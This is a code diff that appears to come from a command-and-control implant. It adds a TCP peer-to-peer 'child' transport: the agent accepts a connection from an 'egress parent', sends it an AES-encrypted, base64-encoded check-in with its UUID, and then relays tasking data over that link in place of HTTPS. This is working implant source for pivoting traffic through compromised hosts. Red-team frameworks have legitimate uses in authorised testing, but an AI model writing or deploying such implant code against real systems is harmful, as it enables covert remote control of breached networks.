@@ -370,3 +370,126 @@ void cmd_disconnect_handler(const char *task_uuid, parser_t *params) {
     queue_response(task_uuid, RSP_ERROR, "link not found");
     free(agent_uuid);
 }
+
+/* ================================================================
+ *  TCP P2P CHILD TRANSPORT
+ *  Used when built with TCP_TRANSPORT: the child agent listens
+ *  for the egress parent to connect, then sends all data over
+ *  that TCP connection instead of HTTPS.
+ * ================================================================ */
+
+int tcp_p2p_child_accept(void) {
+    if (g_state.tcp_listen_sock < 0) return 0;
+    if (g_state.p2p_parent_sock >= 0) return 1;
+
+    struct sockaddr_in client_addr;
+    socklen_t client_len = sizeof(client_addr);
+    int client = accept(g_state.tcp_listen_sock, (struct sockaddr *)&client_addr, &client_len);
+    if (client < 0) return 0;
+
+    DBG("tcp_p2p_child: parent connected from %s", inet_ntoa(client_addr.sin_addr));
+
+    struct timeval tv = { 30, 0 };
+    setsockopt(client, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
+    setsockopt(client, SOL_SOCKET, SO_SNDTIMEO, &tv, sizeof(tv));
+
+    /* send mini-checkin so the parent can identify us */
+    packer_t p;
+    pk_init(&p);
+    pk_byte(&p, ACTION_CHECKIN);
+    pk_string(&p, g_state.uuid);
+
+    uint32_t enc_len;
+    uint8_t *enc = aes_encrypt(p.data, p.len, &enc_len);
+    pk_free(&p);
+
+    if (enc) {
+        uint32_t uuid_len = (uint32_t)strlen(g_state.uuid);
+        uint32_t raw_len = uuid_len + enc_len;
+        uint8_t *raw = (uint8_t *)malloc(raw_len);
+        memcpy(raw, g_state.uuid, uuid_len);
+        memcpy(raw + uuid_len, enc, enc_len);
+        free(enc);
+
+        size_t b64_len;
+        char *b64 = b64_encode(raw, raw_len, &b64_len);
+        free(raw);
+
+        if (b64) {
+            tcp_raw_send(client, (uint8_t *)b64, (uint32_t)b64_len);
+            free(b64);
+        }
+    }
+
+    g_state.p2p_parent_sock = client;
+    DBG("tcp_p2p_child: parent link established");
+    return 1;
+}
+
+static int tcp_recv_blocking(int sock, uint8_t **data, uint32_t *len, int timeout_sec) {
+    *data = NULL;
+    *len = 0;
+
+    struct timeval tv = { timeout_sec, 0 };
+    setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
+
+    uint8_t header[4];
+    uint32_t total_hdr = 0;
+    while (total_hdr < 4) {
+        ssize_t r = recv(sock, header + total_hdr, 4 - total_hdr, 0);
+        if (r <= 0) return -1;
+        total_hdr += (uint32_t)r;
+    }
+
+    uint32_t msg_size = ((uint32_t)header[0] << 24) |
+                        ((uint32_t)header[1] << 16) |
+                        ((uint32_t)header[2] << 8)  |
+                        ((uint32_t)header[3]);
+
+    if (msg_size == 0 || msg_size > 0x3C00000) return -1;
+
+    uint8_t *buf = (uint8_t *)malloc(msg_size);
+    if (!buf) return -1;
+
+    uint32_t total_read = 0;
+    while (total_read < msg_size) {
+        uint32_t chunk = msg_size - total_read;
+        if (chunk > TCP_RECV_BUF_MAX) chunk = TCP_RECV_BUF_MAX;
+        ssize_t r = recv(sock, buf + total_read, chunk, 0);
+        if (r <= 0) { free(buf); return -1; }
+        total_read += (uint32_t)r;
+    }
+
+    *data = buf;
+    *len = msg_size;
+    return 0;
+}
+
+uint8_t *tcp_p2p_send(const uint8_t *data, uint32_t data_len, uint32_t *resp_len) {
+    *resp_len = 0;
+    if (g_state.p2p_parent_sock < 0) {
+        DBG("tcp_p2p_send: no parent connection");
+        return NULL;
+    }
+
+    DBG("tcp_p2p_send: sending %u bytes", data_len);
+    if (tcp_raw_send(g_state.p2p_parent_sock, data, data_len) < 0) {
+        DBG("tcp_p2p_send: send failed, parent disconnected");
+        close(g_state.p2p_parent_sock);
+        g_state.p2p_parent_sock = -1;
+        return NULL;
+    }
+
+    uint8_t *resp_data = NULL;
+    uint32_t resp_data_len = 0;
+    if (tcp_recv_blocking(g_state.p2p_parent_sock, &resp_data, &resp_data_len, 60) < 0) {
+        DBG("tcp_p2p_send: recv timeout/error");
+        close(g_state.p2p_parent_sock);
+        g_state.p2p_parent_sock = -1;
+        return NULL;
+    }
+
+    DBG("tcp_p2p_send: received %u bytes", resp_data_len);
+    *resp_len = resp_data_len;
+    return resp_data;
+}
